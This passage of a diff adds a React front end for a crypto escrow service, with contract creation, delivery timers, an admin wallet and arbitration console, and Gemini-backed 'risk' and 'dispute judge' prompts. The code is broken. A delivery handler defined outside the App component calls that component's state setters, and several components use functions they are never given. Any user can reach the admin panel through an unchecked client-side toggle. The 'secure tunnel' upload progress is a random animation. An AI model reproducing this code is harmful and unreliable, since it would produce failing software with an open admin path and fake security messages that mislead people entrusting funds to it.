+                            currency: result.currency || 'Ethereum (ETH)'
+                        }));
+                    }
+                    setIsAiLoading(false);
+                };
+
+                const handleSubmit = (e) => {
+                    e.preventDefault();
+                    if (!form.title || !form.amount) return alert("Please fill all fields");
+                    const newTx = { 
+                        title: form.title, 
+                        amount: form.amount, 
+                        role: form.role, 
+                        currency: form.currency, 
+                        status: 'created', 
+                        buyerVerification: 'pending', 
+                        buyerName: form.role === 'buyer' ? currentUser.name : form.otherParty, 
+                        sellerName: form.role === 'seller' ? currentUser.name : form.otherParty, 
+                        creator: currentUser.name, 
+                        history: [{ step: 'Agreement Created', time: new Date().toLocaleTimeString(), complete: true }] 
+                    };
+                    db.saveTransaction(newTx);
+                    showNotification("Contract Initialized");
+                    setView('dashboard');
+                };
+
+                return (
+                    <div className="max-w-xl mx-auto mt-16 mb-20 px-6">
+                        <button onClick={() => setView('dashboard')} className="text-neutral-500 hover:text-white mb-8 flex items-center gap-2 text-sm uppercase font-bold"><i className="ph ph-arrow-left"></i> Back</button>
+                        
+                        {/* AI DRAFTER UI WITH LIVE FEED */}
+                        <div className="glass-panel p-1 rounded-lg mb-6 border border-purple-500/30">
+                            <div className="bg-black/60 p-4 rounded-md flex flex-col gap-3">
+                                <div className="flex gap-3 items-center">
+                                    <i className="ph ph-sparkle-fill text-purple-400 text-xl animate-pulse"></i>
+                                    <input 
+                                        type="text" 
+                                        placeholder="" 
+                                        className="bg-transparent flex-1 text-sm text-white outline-none placeholder-neutral-600"
+                                        value={aiPrompt}
+                                        onChange={e => setAiPrompt(e.target.value)}
+                                        onKeyDown={e => e.key === 'Enter' && handleAIDraft()}
+                                    />
+                                    <button onClick={handleAIDraft} disabled={isAiLoading} className="text-[10px] font-bold uppercase text-purple-400 hover:text-purple-300">
+                                        {isAiLoading ? 'Thinking...' : 'Auto-Fill'}
+                                    </button>
+                                </div>
+                                {/* LIVE TICKER */}
+                                {liveFeed && (
+                                    <div className="text-[10px] text-emerald-400/60 font-mono uppercase tracking-widest flex items-center gap-2 animate-pulse pt-2 border-t border-white/5">
+                                        <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full"></div>
+                                        Live: {liveFeed}
+                                    </div>
+                                )}
+                            </div>
+                        </div>
+
+                        <div className="glass-panel p-8 md:p-10 rounded-lg">
+                            <h2 className="text-3xl font-serif text-white mb-8 border-b border-white/10 pb-4">New Contract</h2>
+                            <div className="space-y-6">
+                                <div className="grid grid-cols-2 gap-4">
+                                    <button onClick={() => setForm({...form, role: 'buyer'})} className={`p-4 rounded border transition ${form.role === 'buyer' ? 'bg-white text-black border-white' : 'bg-transparent text-neutral-500 border-white/10'}`}>Buyer</button>
+                                    <button onClick={() => setForm({...form, role: 'seller'})} className={`p-4 rounded border transition ${form.role === 'seller' ? 'bg-white text-black border-white' : 'bg-transparent text-neutral-500 border-white/10'}`}>Seller</button>
+                                </div>
+                                <div><label className="block text-xs font-bold uppercase text-neutral-500 mb-3">Counterparty Name</label><input type="text" className="w-full luxury-input rounded p-4" value={form.otherParty} onChange={e => setForm({...form, otherParty: e.target.value})} /></div>
+                                <div><label className="block text-xs font-bold uppercase text-neutral-500 mb-3">Asset</label><input type="text" className="w-full luxury-input rounded p-4" value={form.title} onChange={e => setForm({...form, title: e.target.value})} /></div>
+                                <div className="grid grid-cols-2 gap-4">
+                                    <div>
+                                        <CustomSelect 
+                                            label="Network"
+                                            options={Object.keys(adminWallets)}
+                                            value={form.currency}
+                                            onChange={(val) => setForm({...form, currency: val})}
+                                        />
+                                    </div>
+                                    <div>
+                                        <label className="block text-xs font-bold uppercase text-neutral-500 mb-3">Value</label>
+                                        <div className="relative">
+                                            <input 
+                                                type="number" 
+                                                step="0.000001" 
+                                                className="w-full luxury-input rounded p-4 font-mono pr-12" 
+                                                value={form.amount} 
+                                                onChange={e => setForm({...form, amount: e.target.value})} 
+                                            />
+                                            <span className="absolute right-4 top-1/2 -translate-y-1/2 text-neutral-500 font-bold text-xs">{getSymbol(form.currency)}</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                <button onClick={handleSubmit} className="glow-button w-full text-center">Initialize Contract</button>
+                            </div>
+                        </div>
+                    </div>
+                );
+            };
+
+            const Dashboard = ({ transactions, setView, setShowDepositModal, setShowDeliverModal, showNotification, setProcessingAction }) => {
+                const [now, setNow] = useState(Date.now());
+                useEffect(() => { const i = setInterval(() => setNow(Date.now()), 1000); return () => clearInterval(i); }, []);
+
+                const getTimerStatus = (tx) => {
+                    if (tx.status === 'created') return { mode: 'preview', text: "2 HR Delivery Window" };
+                    if (tx.status === 'delivered' || tx.status === 'released' || tx.status === 'refunded') return null;
+                    if (tx.status === 'funded' && tx.fundedAt) {
+                        const diff = (tx.fundedAt + 2 * 60 * 60 * 1000) - now;
+                        if (diff <= 0) return { expired: true, text: "Time Expired" };
+                        
+                        const h = Math.floor(diff / 3600000);
+                        const m = Math.floor((diff % 3600000) / 60000);
+                        const s = Math.floor((diff % 60000) / 1000);
+                        const hStr = h.toString().padStart(2, '0');
+                        const mStr = m.toString().padStart(2, '0');
+                        const sStr = s.toString().padStart(2, '0');
+                        
+                        return { expired: false, text: `${hStr}:${mStr}:${sStr}`, label: "Remaining" }; 
+                    }
+                    return null;
+                };
+
+                // FEATURE 1: AI TRANSACTION ANALYST
+                const handleAIAnalyze = async (tx) => {
+                    setProcessingAction({ type: 'ai', text: 'Analyzing Risk...', status: 'processing' });
+                    const prompt = `Act as a crypto security expert. Analyze this escrow transaction:
+                    Item: ${tx.title}
+                    Amount: ${tx.amount} ${tx.currency}
+                    Buyer: ${tx.buyerName}
+                    Seller: ${tx.sellerName}
+                    
+                    Provide a Risk Assessment (Low/Medium/High) and one clear safety tip for the user. Keep it under 40 words.`;
+                    const advice = await callGemini(prompt);
+                    setProcessingAction(null);
+                    if (advice) setAiResponse(advice);
+                    else alert("AI Service Unavailable");
+                };
+                
+                const handleAction = (tx, action) => {
+                    if (action === 'deposit') return setShowDepositModal(tx);
+                    if (action === 'deliver') {
+                        setShowDeliverModal(tx);
+                        return;
+                    }
+                    let updates = {};
+                    if (action === 'verify_good') updates = { buyerVerification: 'verified', history: [...tx.history, { step: 'Buyer Verified', time: new Date().toLocaleTimeString(), complete: true }] };
+                    if (action === 'refund') { if(!confirm("Claim Refund?")) return; updates = { status: 'refund_requested' }; }
+                    db.updateTransaction(tx.id, updates);
+                    showNotification("Updated");
+                };
+
+                return (
+                    <div className="max-w-6xl mx-auto px-6 mt-16 mb-24">
+                        <div className="flex justify-between items-end mb-12 border-b border-white/10 pb-6"><h2 className="text-4xl font-serif text-white">My Contracts</h2><button onClick={() => setView('create')} className="px-6 py-3 bg-white text-black rounded text-xs font-bold uppercase hover:bg-neutral-200">+ New</button></div>
+                        <div className="grid gap-6">
+                            {transactions.map(tx => {
+                                const timer = getTimerStatus(tx);
+                                return (
+                                    <div key={tx.id} className="glass-panel p-8 rounded-lg flex flex-col md:flex-row items-center justify-between gap-8 hover:border-white/20 transition group relative">
+                                        
+                                        {/* AI ANALYZE BUTTON */}
+                                        <button 
+                                            onClick={() => handleAIAnalyze(tx)}
+                                            className="absolute top-4 right-4 w-8 h-8 rounded-full bg-white/5 border border-white/10 hover:bg-purple-500/20 hover:border-purple-500/50 flex items-center justify-center text-neutral-400 hover:text-purple-300 transition z-20"
+                                            title="AI Risk Check"
+                                        >
+                                            <i className="ph ph-sparkle"></i>
+                                        </button>
+
+                                        {timer && (
+                                            <div className={`absolute -top-3 left-1/2 -translate-x-1/2 flex items-center gap-2 px-4 py-1.5 rounded-full border backdrop-blur-md shadow-xl z-10
+                                                ${timer.expired ? 'bg-red-500/10 border-red-500/50 text-red-200' : 
+                                                  timer.mode === 'preview' ? 'bg-neutral-900/90 border-white/10 text-neutral-400' : 
+                                                  'bg-emerald-900/20 border-emerald-500/30 text-emerald-400'}`}>
+                                                {timer.mode !== 'preview' && !timer.expired && (
+                                                    <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse shadow-[0_0_8px_rgba(52,211,153,0.8)]"></div>
+                                                )}
+                                                <span className="text-[10px] font-bold uppercase tracking-widest font-mono">{timer.text}</span>
+                                            </div>
+                                        )}
+                                        
+                                        <div><h3 className="text-xl font-serif text-white mb-1">{tx.title}</h3><div className="text-xs text-neutral-500 uppercase flex gap-4"><span>Buyer: {tx.buyerName}</span><span>Seller: {tx.sellerName}</span></div></div>
+                                        <div className="flex items-center gap-4 min-w-[200px] justify-end">
+                                            <div className="text-[10px] font-bold uppercase text-neutral-400 border px-3 py-1 rounded">{tx.status.replace('_', ' ')}</div>
+                                            {tx.status === 'created' && <button onClick={() => handleAction(tx, 'deposit')} className="px-5 py-2 bg-white text-black text-xs font-bold uppercase rounded">Deposit</button>}
+                                            {tx.status === 'funded' && !timer?.expired && <button onClick={() => handleAction(tx, 'deliver')} className="px-5 py-2 bg-white text-black text-xs font-bold uppercase rounded">Deliver</button>}
+                                            {tx.status === 'funded' && timer?.expired && <button onClick={() => handleAction(tx, 'refund')} className="px-5 py-2 bg-red-600 text-white text-xs font-bold uppercase rounded">Refund</button>}
+                                            {tx.status === 'delivered' && tx.buyerVerification !== 'verified' && <><a href={tx.sellerDelivery} target="_blank" className="px-5 py-2 border border-white/20 text-white text-xs font-bold uppercase rounded">Download</a><button onClick={() => handleAction(tx, 'verify_good')} className="px-5 py-2 bg-emerald-500 text-black text-xs font-bold uppercase rounded">Approve</button></>}
+                                        </div>
+                                    </div>
+                                );
+                            })}
+                        </div>
+                        
+                        {/* Pass handleDeliverySubmit to the modal logic below via closure, or define logic inside App */}
+                        {/* Since Dashboard is inside App, it can trigger state in App */}
+                    </div>
+                );
+            };
+
+            const AdminPanel = () => {
+                const [walletsInput, setWalletsInput] = useState(adminWallets);
+                const [errors, setErrors] = useState({}); 
+
+                // FEATURE 3: AI DISPUTE JUDGE
+                const handleAISuggestion = async (tx) => {
+                    setProcessingAction({ type: 'ai', text: 'Reviewing Case...', status: 'processing' });
+                    const prompt = `Act as an arbitration judge. 
+                    Dispute Details:
+                    Asset: ${tx.title} (${tx.amount} ${tx.currency})
+                    Buyer: ${tx.buyerName} | Seller: ${tx.sellerName}
+                    Status: ${tx.status}
+                    Evidence: Buyer Proof: ${tx.buyerProof ? 'Provided' : 'Missing'}, Seller Link: ${tx.sellerDelivery ? 'Provided' : 'Missing'}
+                    
+                    Generate a fair resolution recommendation (2-3 sentences).`;
+                    
+                    const advice = await callGemini(prompt);
+                    setProcessingAction(null);
+                    if(advice) setAiResponse(advice);
+                };
+
+                const validateAddress = (c, a) => {
+                    if (!a.trim()) return "Required";
+                    if (["Ethereum (ETH)", "Base (ETH L2)", "Polygon (POL)", "Monad (MON)"].includes(c)) return /^0x[a-fA-F0-9]{40}$/.test(a) ? null : "Invalid Hex";
+                    if (c === "Solana (SOL)") return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(a) ? null : "Invalid Base58";
+                    return null;
+                };
+
+                const saveWallets = () => { 
+                    const newErrors = {};
+                    let hasError = false;
+                    Object.entries(walletsInput).forEach(([c, a]) => {
+                        const err = validateAddress(c, a);
+                        if (err) { newErrors[c] = err; hasError = true; }
+                    });
+                    if (hasError) { setErrors(newErrors); showNotification("Invalid Addresses", "error"); return; }
+                    db.saveAdminWallets(walletsInput); 
+                    showNotification("Vault Secured"); 
+                };
+                
+                const handleAdminAction = (txId, action) => {
+                    if (!confirm(`Confirm ${action}?`)) return;
+                    db.updateTransaction(txId, action === 'release' ? { status: 'released' } : { status: 'refunded' });
+                    showNotification("Settled");
+                };
+
+                return (
+                    <div className="max-w-7xl mx-auto px-6 mt-16 mb-24">
+                        <div className="glass-panel p-8 rounded-lg mb-10 border border-white/10">
+                            <div className="flex justify-between mb-6"><h2 className="text-2xl font-serif text-white">Vault Configuration</h2><button onClick={saveWallets} className="bg-white text-black px-4 py-2 text-xs font-bold uppercase rounded">Save</button></div>
+                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                {Object.entries(walletsInput).map(([c, a]) => (
+                                    <div key={c}><label className="text-[10px] uppercase text-neutral-500 flex justify-between">{c}{errors[c] && <span className="text-red-400">{errors[c]}</span>}</label><input type="text" value={a} onChange={e => setWalletsInput(p => ({ ...p, [c]: e.target.value }))} className={`w-full bg-transparent border-b py-1 text-white font-mono text-xs focus:outline-none ${errors[c] ? 'border-red-500' : 'border-white/20'}`} /></div>
+                                ))}
+                            </div>
+                        </div>
+                        <div className="glass-panel p-8 rounded-lg"><h2 className="text-2xl font-serif text-white mb-6">Arbitration Console</h2>
+                            <div className="overflow-x-auto"><table className="w-full text-left text-neutral-300 text-xs"><thead className="text-[10px] font-bold uppercase border-b border-white/10"><tr><th className="p-4">Asset</th><th className="p-4">Proof</th><th className="p-4">Delivery</th><th className="p-4">Action</th></tr></thead><tbody>
+                                {transactions.map(tx => (
+                                    <tr key={tx.id} className="border-b border-white/5 hover:bg-white/5">
+                                        <td className="p-4 font-serif">
+                                            {tx.title}<br/><span className="font-mono text-[10px] text-neutral-500">{tx.amount} {tx.currency.split('(')[0]}</span>
+                                            {/* AI JUDGE BUTTON */}
+                                            <div className="mt-1"><button onClick={() => handleAISuggestion(tx)} className="text-[9px] text-purple-400 hover:text-white flex items-center gap-1"><i className="ph ph-sparkle-fill"></i> AI Review</button></div>
+                                        </td>
+                                        <td className="p-4">{tx.buyerProof ? <a href={tx.buyerProof} target="_blank" className="text-blue-400 underline">Receipt</a> : '-'}</td><td className="p-4">{tx.sellerDelivery ? <a href={tx.sellerDelivery} target="_blank" className="text-purple-400 underline">Link</a> : '-'}</td><td className="p-4">{(tx.status === 'delivered' || tx.status === 'funded') && <button onClick={() => handleAdminAction(tx.id, 'release')} className="border border-white/20 px-3 py-1 rounded hover:bg-white hover:text-black font-bold uppercase text-[10px] mr-2">Release</button>}{(tx.status === 'refund_requested' || tx.status === 'funded') && <button onClick={() => handleAdminAction(tx.id, 'refund')} className="border border-red-500/30 text-red-400 px-3 py-1 rounded hover:bg-red-500 hover:text-white font-bold uppercase text-[10px]">Refund</button>}</td></tr>
+                                ))}
+                            </tbody></table></div>
+                        </div>
+                    </div>
+                );
+            };
+
+            if (view === 'auth' && !currentUser) return <AuthScreen />;
+
+            return (
+                <div className="min-h-screen pb-20 selection:bg-white selection:text-black">
+                    {processingAction && <ActionOverlay type={processingAction.type} text={processingAction.text} status={processingAction.status} progress={processingAction.progress} />}
+                    {aiResponse && <AiAdviceModal text={aiResponse} onClose={() => setAiResponse(null)} />}
+                    {toast && <div className="fixed top-4 left-1/2 -translate-x-1/2 bg-white text-black px-6 py-3 rounded-full shadow-2xl z-[100] toast-enter flex items-center gap-3">{toast.type === 'error' ? <i className="ph ph-warning-circle text-red-500"></i> : <i className="ph ph-check-circle text-green-500"></i>}<span className="text-sm font-bold uppercase tracking-widest">{toast.msg}</span></div>}
+                    <Navbar />
+                    {view === 'landing' ? <LandingPage testAnim={() => {}} /> : view === 'auth' ? <AuthScreen /> : view === 'home' ? <Hero /> : view === 'dashboard' ? <Dashboard setView={setView} transactions={transactions} showNotification={showNotification} setShowDepositModal={setShowDepositModal} setShowDeliverModal={setShowDeliverModal} /> : view === 'create' ? <CreateTransaction setView={setView} adminWallets={adminWallets} currentUser={currentUser} showNotification={showNotification} /> : view === 'admin' ? <AdminPanel /> : null}
+                    {showDepositModal && <DepositModal tx={showDepositModal} onClose={() => setShowDepositModal(null)} />}
+                    {showDeliverModal && <DeliverModal tx={showDeliverModal} onClose={() => setShowDeliverModal(null)} onDeliver={handleDeliverySubmit} />}
+                    {currentUser && (
+                        <div className="fixed bottom-8 left-1/2 -translate-x-1/2 bg-[#050505] p-1.5 rounded-full border border-white/20 shadow-2xl flex gap-1 z-50">
+                            <button onClick={() => { setIsAdmin(false); setView('dashboard'); }} className={`px-6 py-2 rounded-full text-[10px] font-bold uppercase ${!isAdmin ? 'bg-white text-black' : 'text-neutral-500'}`}>Client</button>
+                            <button onClick={() => { setIsAdmin(true); setView('admin'); }} className={`px-6 py-2 rounded-full text-[10px] font-bold uppercase ${isAdmin ? 'bg-white text-black' : 'text-neutral-500'}`}>Admin</button>
+                        </div>
+                    )}
+                </div>
+            );
+        };
+
+        const handleDeliverySubmit = (link) => {
+             setProcessingAction({ type: 'deliver', text: 'Establishing Secure Tunnel...', status: 'uploading', progress: 0 });
+             let progress = 0;
+             const interval = setInterval(() => {
+                 const speed = Math.random() * 15 + 2; 
+                 progress += speed;
+                 if(progress > 100) progress = 100;
+                 setProcessingAction(prev => ({ ...prev, progress }));
+                 if(progress >= 100) {
+                     clearInterval(interval);
+                     setTimeout(() => {
+                         setProcessingAction({ type: 'deliver', text: 'Asset Delivered!', status: 'success' });
+                         setTimeout(() => {
+                             db.updateTransaction(showDeliverModal.id, { status: 'delivered', sellerDelivery: link, history: [...showDeliverModal.history, { step: 'Delivered', time: new Date().toLocaleTimeString(), complete: true }] });
+                             setProcessingAction(null);
+                         }, 1500);
+                     }, 500);
+                 }
+             }, 300);
+        };
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
+</body>
+</html>
